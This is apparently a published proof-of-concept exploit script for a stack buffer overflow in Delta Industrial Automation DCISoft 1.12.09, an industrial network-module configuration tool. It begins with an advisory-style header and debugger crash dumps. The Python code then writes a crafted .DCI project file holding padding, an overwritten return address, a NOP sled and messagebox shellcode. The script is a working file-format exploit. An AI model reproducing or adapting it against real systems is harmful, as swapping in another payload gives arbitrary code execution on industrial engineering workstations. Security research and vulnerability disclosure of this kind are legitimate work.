#!/usr/bin/env python
#
#
# Delta Industrial Automation DCISoft 1.12.09 Stack Buffer Overflow Exploit
#
#
# Vendor: Delta Electronics, Inc.
# Product web page: http://www.delta.com.tw
# Software link: http://www.delta.com.tw/product/em/download/download_main.asp?act=3&pid=3&cid=5&tpid=3
# Affected version: 1.12.09 (Build 12102014)
#
# Summary: DCISoft is a integrated configuration tool of Delta
# network modules (DVPEN01-SL, RTU-EN01, IFD9506, IFD9507, DVPSCM12-SL,
# DVPSCM52-SL) for WINDOWS operation system.
#
# Desc: The vulnerability is caused due to a boundary error in
# the processing of a project file, which can be exploited to
# cause a stack based buffer overflow when a user opens e.g. a
# specially crafted .DCI file. Successful exploitation allows
# execution of arbitrary code on the affected machine.
#
# ----------------------------------------------------------------------------
# (1554.1830): Access violation - code c0000005 (!!! second chance !!!)
# eax=00000001 ebx=0018f684 ecx=44444444 edx=777a4a20 esi=0018f65c edi=777a4a20
# eip=73d34b64 esp=0018cdd8 ebp=0018cdec iopl=0         nv up ei pl nz na po nc
# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
# MFC42!Ordinal2740+0x88:
# 73d34b64 8b01            mov     eax,dword ptr [ecx]  ds:002b:44444444=????????
# 0:000> d esp
# 0018cdd8  1c f6 18 00 a8 a5 47 00-01 00 00 00 01 00 00 00  ......G.........
# 0018cde8  5c f6 18 00 fc cd 18 00-a4 59 41 00 e1 b5 85 88  \........YA.....
# 0018cdf8  5c f6 18 00 d8 f8 18 00-fa 38 41 00 84 f6 18 00  \........8A.....
# 0018ce08  c8 8f 74 02 e8 1f 7c 02-04 ce 18 00 c8 8f 74 02  ..t...|.......t.
# 0018ce18  04 ce 18 00 44 44 44 44-44 44 44 44 44 44 44 44  ....DDDDDDDDDDDD
# 0018ce28  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
# 0018ce38  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
# 0018ce48  44 44 44 44 44 44 44 44-44 44 44 44 44 44 44 44  DDDDDDDDDDDDDDDD
# --
# (11bc.1394): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# Defaulted to export symbols for C:\Program Files (x86)\Delta Industrial Automation\Communication\DCISoft 1.12\MFC42.DLL - 
# eax=0018cdfc ebx=0018f684 ecx=0018cdec edx=ce085164 esi=0018f65c edi=31f7ae9c
# eip=43434343 esp=0018cdcc ebp=0018cdec iopl=0         nv up ei pl nz ac pe cy
# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210217
# 43434343 ??              ???
# ----------------------------------------------------------------------------
#
# Tested on: Microsoft Windows 7 Professional SP1 (EN)
#            Microsoft Windows 7 Ultimate SP1 (EN)
#
#
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
#
#
# Advisory ID: ZSL-2016-5305
# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5305.php
#
#
# 13.11.2015
#


sc = ("\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
      "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
      "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
      "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
      "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
      "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x65\x64"
      "\x21\x01\x68\x20\x50\x77\x6e\x68\x20\x5a\x53\x4c\x89\xe1\xfe"
      "\x49\x0b\x31\xc0\x51\x50\xff\xd7")

buffer = "\x41" * 156          # align
buffer += "\x3c\xce\x18\x00"   # eip - jmp esp+49h
buffer += "\x90" * 15          # nopsled
buffer += sc                   # 113 bytes messagebox shellcode
buffer += "\x44" * 7926        # extra shellcode space
buffer += "\xec\xcd\x18\x00"   # overwrite data segment to control eip - mov eax,dword ptr [ecx]
buffer += "\x45" * 2203        # padding to fix 10421 bytes

f = open ("Detachment.dci", "w")
f.write(buffer)
f.close()
print "File Detachment.dci successfully created!\n"
